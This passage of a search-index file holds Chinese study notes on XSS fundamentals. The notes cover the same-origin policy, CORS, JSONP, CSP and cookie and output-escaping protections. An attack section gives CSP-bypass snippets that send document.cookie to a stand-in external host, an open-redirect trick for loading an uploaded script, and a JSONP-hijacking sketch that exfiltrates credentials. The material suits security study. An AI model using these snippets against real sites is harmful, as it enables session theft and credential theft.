1.\u5982\u679c\u6ca1\u6709DOM\u540c\u6e90\u7b56\u7565\uff0c\u5c31\u610f\u5473\u7740\u4e00\u4e2a\u9875\u9762\u53ef\u4ee5\u5bf9\u4efb\u610f\u9875\u9762\u7684DOM\u8fdb\u884c\u64cd\u4f5c\u3002\u90a3\u4e48\u5c31\u4f1a\u5bfc\u81f4\u4ee5\u4e0b\u5b89\u5168\u95ee\u9898: \u505a\u4e00\u4e2a\u5047\u7f51\u7ad9\uff0c\u5e76\u63d2\u5165\u4e00\u4e2a\u5360\u6ee1\u5168\u9875\u9762\u7684iframe\u6307\u5411\u4e00\u4e2a\u767b\u9646\u754c\u9762\u5982\u94f6\u884c\u767b\u5f55\u754c\u9762\u3002\u7528\u6237\u8fdb\u6765\u540e\u4f1a\u53d1\u73b0\u9664\u4e86\u57df\u540d\u4e0d\u540c\uff0c\u5176\u4ed6\u90fd\u548c\u6b63\u5e38\u7684\u94f6\u884c\u767b\u9646\u754c\u9762\u4e00\u81f4\u3002\u82e5\u7528\u6237\u8f93\u5165\u4e86\u8d26\u53f7\u5bc6\u7801\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u8de8\u57df\u8bfb\u53d6\u5230\u94f6\u884c\u767b\u9646\u754c\u9762\u7684dom\u6811\uff0c\u4ece\u800c\u8bfb\u53d6\u7528\u6237\u8f93\u5165\u7684\u8d26\u53f7\u5bc6\u7801\u3002 2.\u5982\u679c\u6ca1\u6709XMLHttpRequest\uff0c\u5c31\u610f\u5473\u7740\u53ef\u4ee5\u4e00\u4e2a\u9875\u9762\u53ef\u4ee5\u5411\u4efb\u610f\u9875\u9762\u53d1\u8d77HTTP\u8bf7\u6c42\u3002\u90a3\u4e48\u5c31\u4f1a\u5bfc\u81f4\u4ee5\u4e0b\u5b89\u5168\u95ee\u9898: \u5f53\u4e00\u4e2a\u7528\u6237\u767b\u9646\u4e86\u67d0\u4e2a\u7cfb\u7edf\uff0c\u5982\u94f6\u884c\u4e2a\u4eba\u7cfb\u7edf\uff0c\u6b64\u65f6\u94f6\u884c\u7f51\u7ad9\u4f1a\u7ed9\u7528\u6237\u8fd4\u56decookie\u3002\u5982\u679c\u7528\u6237\u6b64\u65f6\u8bbf\u95ee\u4e86\u6211\u4eec\u7684\u6076\u610f\u7f51\u7ad9\uff0c\u5c31\u4f1a\u6267\u884c\u6211\u4eec\u6076\u610f\u7f51\u7ad9\u4e2d\u7684\u6076\u610fAJAX\u4ee3\u7801\uff0c\u6b64AJAX\u4ee3\u7801\u4f1a\u5411\u94f6\u884c\u7f51\u7ad9\u53d1\u8d77HTTP\u8bf7\u6c42\uff0c\u6bd4\u5982\u53d1\u8d77\u67e5\u8be2\u8d26\u6237\u4f59\u989d\u7684\u8bf7\u6c42\uff08\u6b64\u65f6\u4f1a\u9ed8\u8ba4\u9644\u5e26\u7528\u6237\u7684cookie\uff09\u3002\u94f6\u884c\u9875\u9762\u53d1\u73b0cookie\u65e0\u8bef\uff0c\u5c31\u4f1a\u8fd4\u56de\u8bf7\u6c42\u7684\u6570\u636e:\u8d26\u6237\u4f59\u989d\uff0c\u9020\u6210\u6570\u636e\u6cc4\u9732\u3002 \u8de8\u57df \u4e0a\u9762\u6211\u4eec\u8bf4\u4e86\u540c\u6e90\u7b56\u7565\u4e2d\uff0c\u4e00\u4e2a\u9875\u9762\u4e0d\u80fd\u5bf9\u4e0d\u540c\u6e90\u7684\u9875\u9762\u8fdb\u884c\u64cd\u4f5c\u3002\u4f46\u662f\u5728\u5b9e\u9645\u60c5\u51b5\u4e2d\uff0c\u8fd8\u662f\u6709\u4e00\u4e9bjs\u6807\u7b7e\u80fd\u6446\u8131\u8fd9\u79cd\u675f\u7f1a,\u5982script\u6807\u7b7e\u5c31\u80fd\u901a\u8fc7src\u5c5e\u6027\u83b7\u53d6\u4e0d\u540c\u6e90\u9875\u9762\u4e0a\u7684js\u4ee3\u7801\uff0ciframe\u80fd\u5d4c\u5165\u4e0d\u540c\u6e90\u7ad9\u70b9\u7684\u8d44\u6e90\u7b49\u7b49\u3002 \u8fd9\u6837\u7684\u6807\u7b7e\u6709\u5982\u4e0b <script src=\"...\"></script> <link rel=\"stylesheet\" href=\"...\"> <img> / <video> / <audio> <object> <embed> \u548c <applet> \u7684\u63d2\u4ef6 @font-face <frame> \u548c <iframe> \u4f46\u4ec5\u4ec5\u662f\u8fd9\u6837\uff0c\u6709\u4e9b\u65f6\u5019\u8fd8\u662f\u65e0\u6cd5\u8fbe\u5230\u4e1a\u52a1\u7684\u9700\u6c42\uff0c\u6211\u4eec\u6709\u65f6\u9700\u8981\u7a81\u7834\u8fd9\u79cd\u9650\u5236\u6765\u8fbe\u5230\u4e1a\u52a1\u9700\u6c42\uff0c\u4e5f\u5c31\u662f\u907f\u5f00\u540c\u6e90\u7b56\u7565\uff0c\u4ee5\u4e0b\u662f\u51e0\u79cd\u89e3\u51b3\u65b9\u6848\u3002 CORS CORS\uff0c\u5373\u8de8\u57df\u8d44\u6e90\u5171\u4eab\uff0c\u5b83\u662f\u4e00\u4e2aW3C\u6807\u51c6\uff0c\u5b9a\u4e49\u4e86\u5fc5\u987b\u8bbf\u95ee\u8de8\u57df\u8d44\u6e90\u65f6\uff0c\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u8be5\u5982\u4f55\u534f\u5546\u3002 \u5176\u5b9e\u8d28\u5c31\u662f\u4ee5AJAX\u4e3a\u8f7d\u4f53\uff0c\u4f7f\u7528\u81ea\u5b9a\u4e49HTTP\u5934\u8ba9\u6d4f\u89c8\u5668\u4e0e\u670d\u52a1\u5668\u8fdb\u884c\u534f\u5546\uff0c\u4ece\u800c\u51b3\u5b9a\u8de8\u57df\u8bf7\u6c42\u662f\u5426\u5e94\u8be5\u6210\u529f\u3002 \u6240\u4ee5\u5b9e\u73b0CORS\u901a\u4fe1\u7684\u5173\u952e\u662f\u670d\u52a1\u5668\u662f\u5426\u5b9e\u73b0\u4e86CORS\u63a5\u53e3\u3002 \u53e6\u5916\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u6d4f\u89c8\u5668\u90fd\u652f\u6301CORS\uff0c\u6bd4\u5982IE6,IE7,Opera min \u4e0d\u652f\u6301CORS\u3002 \u5b9e\u73b0\u539f\u7406 \u6d4f\u89c8\u5668\u628aCORS\u7684\u8bf7\u6c42\u5206\u6210\u4e24\u7c7b:\u7b80\u5355\u8bf7\u6c42\u4e0e\u975e\u7b80\u5355\u8bf7\u6c42 \u7b80\u5355\u8bf7\u6c42: \u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\uff0c\u5373\u4e3a\u7b80\u5355\u8bf7\u6c42 \u8bf7\u6c42\u65b9\u6cd5\u662f\u4ee5\u4e0b\u4e09\u79cd\u65b9\u6cd5\u4e4b\u4e00\uff1a HEAD GET POST \u4e14HTTP\u7684\u5934\u4fe1\u606f\u4e0d\u8d85\u51fa\u4ee5\u4e0b\u51e0\u79cd\u5b57\u6bb5\uff1a Accept Accept-Language Content-Language Last-Event-ID Content-Type\uff1a\u53ea\u9650\u4e8e\u4e09\u4e2a\u503c application/x-www-form-urlencoded\u3001multipart/form-data\u3001text/plain \u53ea\u8981\u4e0d\u6ee1\u8db3\u4ee5\u4e0a\u6761\u4ef6\uff0c\u90fd\u4e3a\u975e\u7b80\u5355\u8bf7\u6c42\u3002 \u5bf9\u4e8e\u7b80\u5355\u8bf7\u6c42\uff0c\u5176\u5b9e\u73b0\u539f\u7406\u5982\u4e0b: 1.\u5728\u8bf7\u6c42\u5934\u4e2d\u52a0\u4e00\u4e2a\u989d\u5916\u5934:Origin, \u5176\u5305\u542b\u53d1\u51fa\u8bf7\u6c42\u7684\u9875\u9762\u7684\u534f\u8bae\uff0c\u57df\u540d\uff0c\u7aef\u53e3\uff0c\u670d\u52a1\u5668\u4ee5\u6b64\u6765\u5224\u65ad\u662f\u5426\u7ed9\u4e88\u54cd\u5e94\u3002 2.\u670d\u52a1\u5668\u6536\u5230\u8bf7\u6c42\u540e\uff0c\u5224\u522b\u8be5Origin\u6307\u5411\u7684\u7ad9\u70b9\u80fd\u5426\u8de8\u57df\u3002\u82e5\u80fd\u8de8\u57df\uff0c\u5c31\u5728 Access-Control-Allow-Origin \u5934\u90e8\u4e2d\u56de\u53d1\u76f8\u540c\u7684\u6e90\u4fe1\u606f\uff08\u5982\u679c\u662f\u516c\u5171\u8d44\u6e90\uff0c\u53ef\u4ee5\u56de\u53d1 * \uff09\uff1b\u82e5\u4e0d\u80fd\u8de8\u57df\uff0c\u5219\u6ca1\u6709\u8fd9\u4e2a\u5934\u90e8\u6216\u8005\u6e90\u4fe1\u606f\u4e0d\u5339\u914d\uff08\u5373Access-Control-Allow-Origin\u5185\u5bb9\u975e*\u4e14\u4e0eOrigin\u4e0d\u7b26\uff09 3.\u540c\u65f6\u5982\u679c\u670d\u52a1\u5668\u8fd4\u56de\u7684\u5934\u4e2d\u6709 Access-Control-Allow-Credentials: true \uff0c\u5219\u8bf4\u660e\u53ef\u4ee5\u8de8\u57df\u5411\u670d\u52a1\u5668\u53d1\u9001\u5e26\u6709cookie\u7684HTTP\u8bf7\u6c42\u3002 \u5bf9\u4e8e\u975e\u7b80\u5355\u8bf7\u6c42\uff0c\u5b83\u4f1a\u5b9e\u73b0\u8fdb\u884c\u9884\u68c0\uff0c\u5176\u539f\u7406\u5982\u4e0b: 1.\u8fdb\u884c\u9884\u68c0\uff0c\u4ee5OPTIONS\u65b9\u6cd5\u5411\u670d\u52a1\u5668\u53d1\u9001Origin\u5934\u90e8\uff0cAccess-Control-Request-Method\u5934\u90e8\uff08\u63a5\u4e0b\u6765\u7684\u8bf7\u6c42\u65b9\u6cd5\uff0c\u5982POST\uff09\uff0cAccess-Control-Request-Headers\uff08\u81ea\u5b9a\u4e49\u5934\u90e8\u4fe1\u606f\uff0c\u53ef\u9009\uff09 2.\u670d\u52a1\u5668\u54cd\u5e94\uff0c\u6709\u5982\u4e0b\u5934:Access-Control-Allow-Origin,Access-Control-Allow-Methods(\u5141\u8bb8\u7684\u8bf7\u6c42\u65b9\u6cd5)\uff0cAccess-Control-Allow-Headers\uff08\u5141\u8bb8\u7684\u81ea\u5b9a\u4e49\u5934\u90e8\u4fe1\u606f\uff09\uff0cAccess-Control-Max-Age\uff08\u5e94\u8be5\u5c06\u9884\u68c0\u8bf7\u6c42\u7f13\u5b58\u591a\u957f\u65f6\u95f4\uff0c\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09 3.\u901a\u8fc7\u9884\u68c0\u8bf7\u6c42\u540e\uff0c\u4ee5\u540e\u6bcf\u6b21\u6d4f\u89c8\u5668\u7684CORS\u8bf7\u6c42\u90fd\u4f1a\u548c\u7b80\u5355\u8bf7\u6c42\u4e00\u6837\u3002 JSONP \u6211\u4eec\u4e0d\u59a8\u901a\u8fc7\u4e00\u4e2a\u4f8b\u5b50\u6765\u7aa5\u89c6JSONP\u7684\u5b9e\u73b0\u539f\u7406\u3002 \u6211\u4eec\u6709\u5982\u4e0b\u6587\u4ef6test.html <html> <head></head> <body> <h1>HI</h1> <script> var fun1=function(data){ alert(data) } </script> <script type=\"text/javascript\" src=\"http://192.168.111.1/a.js\"></script> </body> </html> \u5176\u5305\u542b\u7684a.js\u5982\u4e0b fun1(\"remote data\"); \u8bbf\u95eetest.html\uff0c\u6210\u529f\u89e6\u53d1\u5f39\u7a97\uff0c\u6211\u4eec\u5c06test.html\u4e2d\u7684fun1\u51fd\u6570\u79f0\u4e3a\u56de\u8c03\u51fd\u6570 \u4e8e\u662f\u5c31\u51fa\u73b0\u4e86\u5229\u7528\u8fd9\u79cd\u539f\u7406\u6765\u5b9e\u73b0\u8de8\u57df\u4f20\u8f93\u6570\u636e\u7684\u65b9\u6cd5\uff1aJSONP \u4e0b\u9762\u8bf4\u8bf4JSONP\u7684\u5177\u4f53\u5b9e\u73b0\u6d41\u7a0b: \u5ba2\u6237\u7aef: 1.\u5b9a\u4e49\u83b7\u53d6\u6570\u636e\u540e\u7684\u56de\u8c03\u51fd\u6570 2.\u52a8\u6001\u751f\u6210\u670d\u52a1\u7aefJS\u8fdb\u884c\u5f15\u7528\u7684\u4ee3\u7801 \u5173\u4e8e\u6b64\u5904\u7b2c2\u70b9\uff0c\u6211\u4eec\u53ef\u4ee5\u8bf4\u9053\u8bf4\u9053\u3002 \u6211\u4eec\u518d\u7528\u8fd9\u4e2a\u65b9\u6cd5\u5b9e\u73b0\u8de8\u57df\u65f6\uff0c\u600e\u4e48\u8ba9\u8fdc\u7a0bJS\u77e5\u9053\u6211\u4eec\u672c\u5730\u7684\u56de\u8c03\u51fd\u6570\u53eb\u4ec0\u4e48\u540d\u5b57\uff1f \u8fd9\u5c31\u9700\u8981\u901a\u8fc7\u4e00\u4e9b\u624b\u6bb5\u52a8\u6001\u751f\u6210\u670d\u52a1\u7aef\u7684JS\u4ee3\u7801\u4e86\u3002 \u6bd4\u5982\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7get\u53c2\u6570\u6765\u63a7\u5236\u5176\u8fd4\u56de\u7684\u672c\u5730\u56de\u8c03\u51fd\u6570\u540d\uff0c\u5982: http://a.com?callback=fun1 \u670d\u52a1\u7aef: \u8fd4\u56de\u7531\u56de\u8c03\u51fd\u6570\u540d\u5305\u88f9\u7684JSON\u6570\u636e\uff0c\u5982 fun1({ \"key1\":\"value1\" }); \u8fd9\u91cc\u4e3a\u4ec0\u4e48\u8981\u7279\u522b\u5f3a\u8c03\u662fJSON\u5462\uff1f\u56e0\u4e3aJSON\u4e0d\u4ec5\u53ef\u4ee5\u7b80\u6d01\u7684\u8868\u8ff0\u590d\u6742\u7684\u6570\u636e\uff0c\u800c\u4e14JS\u539f\u751f\u652f\u6301JSON\uff0c\u53ef\u4ee5\u5728\u5ba2\u6237\u7aef\u81ea\u7531\u5904\u7406JSON\u6570\u636e\uff0c\u6240\u4ee5\u670d\u52a1\u7aef\u591a\u4f20\u56deJSON\u6570\u636e\uff0cJSONP\u8fd9\u4e2a\u540d\u5b57\u4e5f\u662f\u8fd9\u4e48\u6765\u7684\u3002 CSP CSP\uff0c\u5373\u5185\u5bb9\u5b89\u5168\u7b56\u7565\u3002\u5b83\u901a\u8fc7\u767d\u540d\u5355\u7b56\u7565\uff0c\u544a\u8bc9\u5ba2\u6237\u7aef\u54ea\u4e9b\u5916\u90e8\u8d44\u6e90\u53ef\u4ee5\u52a0\u8f7d\u548c\u6267\u884c\u3002 \u540c\u65f6\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cCSP\u76ee\u524d\u67091.0 2.0 3.0 \u7248\u672c\uff0c\u6bcf\u4e2a\u7248\u672c\u7684\u89c4\u5219\u90fd\u6709\u4e0d\u540c CSP\u89c4\u5219 CSP\u901a\u8fc7\u5b9a\u4e49\u4e00\u7cfb\u5217\u89c4\u5219\u6765\u5b9e\u73b0\u5b89\u5168\u7ba1\u7406\u3002 \u9996\u5148\u6211\u4eec\u6765\u770b\u770b\u4e00\u6761CSP\u89c4\u5219\u7684\u8303\u4f8b Content-Security-Policy: default-src https://host1.com https://host2.com; frame-src 'none'; object-src 'none' \u591a\u4e2aCSP\u6307\u4ee4\u95f4\u7528\u5206\u53f7\u9694\u5f00\uff0c\u591a\u4e2a\u6307\u4ee4\u503c\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00 \u4e0b\u9762\u662f\u5404\u4e2a\u6307\u4ee4\u53ca\u5176\u6307\u4ee4\u503c\u7684\u6548\u679c \u6458\u81ea https://blog.csdn.net/qq_37943295/article/details/79978761 \u542f\u7528CSP \u90a3\u4e48\u5982\u4f55\u542f\u7528CSP\u5462\uff1f\u6709\u4e24\u79cd\u65b9\u5f0f 1.\u5728HTTP\u5934\u6dfb\u52a0 \u5728HTTP\u5934\u54cd\u5e94\u6dfb\u52a0content-security-policy\u5934\u5e76\u5199\u5165CSP\u89c4\u5219\u4ee5\u540e\uff0c\u5c31\u80fd\u542f\u7528CSP\u4e86 \u56fe\u5f15\u7528\u4e8e http://www.ruanyifeng.com/blog/2016/09/csp.html 2.\u5728meta\u6807\u7b7e\u91cc\u6dfb\u52a0 \u5411\u5185\u6dfb\u52a0\u5982\u4e0b\u5185\u5bb9 <meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:\"> \u5373\u53ef \u4e00\u4e9b\u5176\u4ed6XSS\u4fdd\u62a4\u673a\u5236 X-Frame X-Frame-Options \u662f\u4e00\u4e2a\u54cd\u5e94\u5934\uff0c\u6307\u5b9a\u6b64\u9875\u9762\u80fd\u5426\u5728\\ \u6216\u8005\\ \u4e2d\u63d2\u5165. \u4ed6\u6709\u4e09\u4e2a\u53ef\u9009\u503c: DENY \u9875\u9762\u4e0d\u80fd\u88ab\u5d4c\u5165\u5230\u4efb\u4f55iframe\u6216frame\u4e2d SAMEORIGIN \u9875\u9762\u53ea\u80fd\u88ab\u672c\u7ad9\u9875\u9762\u5d4c\u5165\u5230iframe\u6216\u8005frame\u4e2d ALLOW-FROM uri \u8868\u793a\u8be5\u9875\u9762\u53ef\u4ee5\u5728\u6307\u5b9a\u6765\u6e90\u7684 frame \u4e2d\u5c55\u793a\u3002 XSS auditor httponly httponly \u662f\u4e00\u4e2a\u9488\u5bf9cookie\u7684\u4fdd\u62a4\u673a\u5236\u3002 \u5176\u5b9e\u73b0\u539f\u7406\u662f\u5728response\u4e2d\u5bf9\u67d0\u4e00\u9879cookie\u8bbe\u7f6e\u4e3aHTTPONLY=true\uff0c\u4ece\u800c\u4f7f\u8be5cookie\u4e0d\u80fd\u88abdocument.cookie \u8bfb\u53d6\u3002 \u6211\u4eec\u968f\u4fbf\u627e\u4e2a\u7f51\u7ad9\uff0c\u53d1\u73b0\u5176captch_session_v2\u5f00\u542f\u4e86httponly \u968f\u540e\u6211\u4eec\u901a\u8fc7document.cookie\u5c1d\u8bd5\u53bb\u8bfb\u53d6aptch_session_v2\u7684\u503c\uff0c\u53d1\u73b0\u5176\u503c\u5e76\u6ca1\u6709\u51fa\u73b0\u5728\u8fd4\u56de\u5185\u5bb9\u4e2d htmlspecialchars htmlspecialchars\u662f\u4e00\u4e2aphp\u51fd\u6570\uff0c\u5b83\u53ef\u4ee5\u5c06\u4e00\u4e9b\u654f\u611f\u5b57\u7b26\u8f6c\u4e49 & (AND) => &amp; \" (\u53cc\u5f15\u53f7) => &quot; (\u5f53ENT_NOQUOTES\u6ca1\u6709\u8bbe\u7f6e\u7684\u65f6\u5019) ' (\u5355\u5f15\u53f7) => &#039; (\u5f53ENT_QUOTES\u8bbe\u7f6e) < (\u5c0f\u4e8e\u53f7) => &lt; > (\u5927\u4e8e\u53f7) => &gt; \u653b\u51fb\u624b\u6bb5 bypass csp csp\uff0c\u662f\u53ef\u4ee5\u88abbypass\u7684\u3002\u6211\u4eec\u63a5\u4e0b\u6765\u5c31\u60f3\u529e\u6cd5bypass csp\u6765\u56de\u4f20cookie 1 default-src 'none'; \u53ef\u4ee5\u901a\u8fc7meta\u6807\u7b7e\u5b9e\u73b0\u91cd\u5b9a\u5411 <meta http-equiv=\"refresh\" content=\"1;url=http://www.xxx.com/x.php?cookie=[cookie]\"> \u5373\uff0c1\u79d2\u540e\u8df3\u8f6c\u81f3\u6307\u5b9aurl 2 script-src \u2018self\u2019 \u2018unsafe-inline\u2019 \u5f00\u653e\u4e86\u5185\u8054\u811a\u672c\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7window.location,windows.open\u6216\u8005meta\u6807\u7b7e\u5b9e\u73b0\u9875\u9762\u8df3\u8f6c\u3002\u4e5f\u53ef\u4ee5\u901a\u8fc7\u52a8\u6001\u521b\u5efa\u5143\u7d20\u5b9e\u73b0\u8df3\u8f6c var a = document.createElement(\"a\"); a.href='http://www.baidu.com'+document.cookie; a.click(); 3 default-src 'self'; script-src 'self' \u9650\u5236\u4e86\u53ea\u80fd\u52a0\u8f7d\u672c\u57dfJS\u811a\u672c\uff0c\u540c\u65f6\u7981\u6b62\u4e86\u5185\u8054\u811a\u672c\u6267\u884c\u3002 \u4e0d\u8fc7\u95ee\u9898\u4e0d\u5927\uff0c\u5982\u679c\u6211\u4eec\u6709\u4e00\u4e2a\u4e0a\u4f20\u70b9\uff0c\u6211\u4eec\u53ef\u4ee5\u4e0a\u4f20\u4e00\u4e2a\u6076\u610fJS\u6587\u4ef6\uff0c\u4e0a\u4f20\u540e\u5982\u679c\u6211\u4eec\u77e5\u9053\u6b64JS\u6587\u4ef6\u4e0a\u4f20\u4f4d\u7f6e\u4e0e\u6587\u4ef6\u540d\u4e14\u4e0a\u4f20\u7684\u4f4d\u7f6e\u662f\u672c\u57df\uff0c\u7136\u540e\u901a\u8fc7XSS\u5b9e\u73b0\u52a0\u8f7d\u6b64\u6076\u610fJS\u6587\u4ef6\u3002 \u53e6\u5916\u5728CSP1.0\u7248\u672c\u4e2d\uff0c\u8fd8\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u8fdb\u884c\u8df3\u8f6c(\u73b0\u5728\u4e0d\u548b\u597d\u7528\u4e86) <link rel=\"prefetch\" href=\"http://xxx.cn\"> (H5\u9884\u52a0\u8f7d) <link rel=\"dns-prefetch\" href=\"http://xxx.cn\"> \uff08DNS\u9884\u52a0\u8f7d\uff09 4 script-src http://www.a.com/b/ \u9650\u5236\u4e86\u53ea\u80fd\u4ece\u67d0\u7279\u5b9a\u8def\u5f84\u53bb\u52a0\u8f7dJS\u811a\u672c \u5bf9\u6b64\u4e00\u822c\u7684\u89e3\u51b3\u65b9\u6cd5\u662f\u770b\u770b\u6b64\u76ee\u5f55\u4e0b\u6709\u6ca1\u6709\u53ef\u63a7\u91cd\u5b9a\u5411\u7684\u6587\u4ef6\uff0c\u6bd4\u5982\u8fd9\u79cd b/302.php <?php Header(\"location: \".$_GET['url'])?> \u6211\u4eec\u5c31\u53ef\u4ee5\u63d2\u5165 <script src=\"b/302.php?url=http://a.com/upload/a.js\"> </script> \u53bb\u52a0\u8f7d\u6211\u4eec\u4e0a\u4f20\u7684JS\u811a\u672c\uff08\u4e0a\u4f20\u70b9\u81ea\u5df1\u627e\uff09 JSONP \u52ab\u6301 \u7b80\u5355\u8bf4\u4e00\u8bf4 \u9996\u5148\u5b58\u5728\u7f51\u7ad9B\uff0c\u5b83\u5305\u542b\u767b\u5f55\u7528\u6237\u7684ID,passwd\u7b49\u654f\u611f\u4fe1\u606f\u3002\u4e14\u6709\u9875\u9762 http://B.com/user?callback= \u7528\u6765\u8fdb\u884cJSONP\u8de8\u57df\u6570\u636e\u4f20\u8f93ID,PASSWD\u7b49\u4fe1\u606f\uff0c\u8fd9\u662f\u524d\u63d0\u3002 \u7528\u6237\u767b\u5f55B\u540e\uff0c\u6253\u5f00\u4e86\u6211\u4eec\u7684\u6076\u610f\u7f51\u7ad9A.com,A.com\u7684\u5185\u5bb9\u4e3a: <script type=\"text/javascript\" src=\"http://B.com/user?jsonp=Callback\"></script> function Callback(result) { \u5c06\u83b7\u53d6\u5185\u5bb9\u4e0a\u4f20\u81f3\u6076\u610f\u670d\u52a1\u5668\u7684JS\u4ee3\u7801..... } \u90a3\u4e48A\u7f51\u7ad9\u5c31\u4f1a\u5411\u7f51\u7ad9B\u8de8\u57df\u8bf7\u6c42\u5230\u654f\u611f\u4fe1\u606f\uff0c\u5e76\u4e0a\u4f20\u5230\u6076\u610f\u670d\u52a1\u5668\u4fdd\u5b58\u3002 \u8fd9\u5c31\u662fJSONP\u52ab\u6301\uff0c\u6b64\u65b9\u6cd5\u5e38\u7528\u4e8e\u6c34\u5751\u653b\u51fb \u5e38\u7528\u89e6\u53d1\u70b9\u4e0ebypass https://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html","title":"\u91cd\u6e29XSS"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E9%87%8D%E6%B8%A9XSS/%E9%87%8D%E6%B8%A9XSS/#xss","text":"","title":"\u91cd\u6e29XSS"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E9%87%8D%E6%B8%A9XSS/%E9%87%8D%E6%B8%A9XSS/#_1","text":"title: XSS\u7684\u4e00\u4e9b\u57fa\u672c\u6982\u5ff5 date: tags: \u5916\u56f4\u6253\u70b9 \u540c\u6e90\u7b56\u7565\u4e0e\u8de8\u57df \u540c\u6e90\u7b56\u7565 \u540c\u6e90\u7684\u5b9a\u4e49 \u540c\u6e90\u7b56\u7565\u7684\u4f5c\u7528 \u8de8\u57df CORS \u5b9e\u73b0\u539f\u7406 JSONP CSP CSP\u89c4\u5219 \u542f\u7528CSP \u4e00\u4e9b\u5176\u4ed6XSS\u4fdd\u62a4\u673a\u5236 X-Frame XSS auditor httponly htmlspecialchars \u653b\u51fb\u624b\u6bb5 bypass csp JSONP \u52ab\u6301 \u5e38\u7528\u89e6\u53d1\u70b9\u4e0ebypass title: XSS\u7684\u4e00\u4e9b\u57fa\u672c\u6982\u5ff5 date: tags: \u5916\u56f4\u6253\u70b9","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E9%87%8D%E6%B8%A9XSS/%E9%87%8D%E6%B8%A9XSS/#_2","text":"","title":"\u540c\u6e90\u7b56\u7565\u4e0e\u8de8\u57df"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E9%87%8D%E6%B8%A9XSS/%E9%87%8D%E6%B8%A9XSS/#_3","text":"","title":"\u540c\u6e90\u7b56\u7565"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E9%87%8D%E6%B8%A9XSS/%E9%87%8D%E6%B8%A9XSS/#_4","text":"\u82e5\u4e24\u4e2aURL \u534f\u8bae\uff0c\u7aef\u53e3\uff0chost\u90fd\u76f8\u540c\uff0c\u5219\u8fd9\u4e24\u4e2aURL\u540c\u6e90\u3002 \u8fd9\u4e2a\u65b9\u6848\u53eb\u505a\u201c\u534f\u8bae/\u4e3b\u673a/\u7aef\u53e3\u5143\u7ec4\u201d\uff0c\u6216\u8005\u76f4\u63a5\u662f \u201c\u5143\u7ec4\u201d \u540c\u6e90\u7b56\u7565\u53c8\u5206\u4e3aDOM\u540c\u6e90\u7b56\u7565(\u7981\u6b62\u5bf9\u4e0d\u540c\u6e90\u7684\u9875\u9762\u7684DOM\u8fdb\u884c\u64cd\u4f5c)\u548cXMLHttpRequest(\u7981\u6b62XHR\u5bf9\u8c61\u9879\u4e0d\u540c\u6e90\u7684\u670d\u52a1\u5668\u5730\u5740\u53d1\u8d77HTTP\u8bf7\u6c42)\u540c\u6e90\u7b56\u7565","title":"\u540c\u6e90\u7684\u5b9a\u4e49"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E9%87%8D%E6%B8%A9XSS/%E9%87%8D%E6%B8%A9XSS/#_5","text":"\u9650\u5236\u4e00\u4e2aJS\u811a\u672c\u5bf9\u4e0d\u540c\u6e90\u7684URL\u8fdb\u884c\u64cd\u4f5c\u3002 \u8fd9\u4e48\u8bf4\u53ef\u80fd\u4f1a\u6709\u70b9\u62bd\u8c61\uff0c\u90a3\u4e0d\u5982\u770b\u770b\u4e0b\u9762\u7684\u4f8b\u5b50: 1.\u5982\u679c\u6ca1\u6709DOM\u540c\u6e90\u7b56\u7565\uff0c\u5c31\u610f\u5473\u7740\u4e00\u4e2a\u9875\u9762\u53ef\u4ee5\u5bf9\u4efb\u610f\u9875\u9762\u7684DOM\u8fdb\u884c\u64cd\u4f5c\u3002\u90a3\u4e48\u5c31\u4f1a\u5bfc\u81f4\u4ee5\u4e0b\u5b89\u5168\u95ee\u9898: \u505a\u4e00\u4e2a\u5047\u7f51\u7ad9\uff0c\u5e76\u63d2\u5165\u4e00\u4e2a\u5360\u6ee1\u5168\u9875\u9762\u7684iframe\u6307\u5411\u4e00\u4e2a\u767b\u9646\u754c\u9762\u5982\u94f6\u884c\u767b\u5f55\u754c\u9762\u3002\u7528\u6237\u8fdb\u6765\u540e\u4f1a\u53d1\u73b0\u9664\u4e86\u57df\u540d\u4e0d\u540c\uff0c\u5176\u4ed6\u90fd\u548c\u6b63\u5e38\u7684\u94f6\u884c\u767b\u9646\u754c\u9762\u4e00\u81f4\u3002\u82e5\u7528\u6237\u8f93\u5165\u4e86\u8d26\u53f7\u5bc6\u7801\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u8de8\u57df\u8bfb\u53d6\u5230\u94f6\u884c\u767b\u9646\u754c\u9762\u7684dom\u6811\uff0c\u4ece\u800c\u8bfb\u53d6\u7528\u6237\u8f93\u5165\u7684\u8d26\u53f7\u5bc6\u7801\u3002 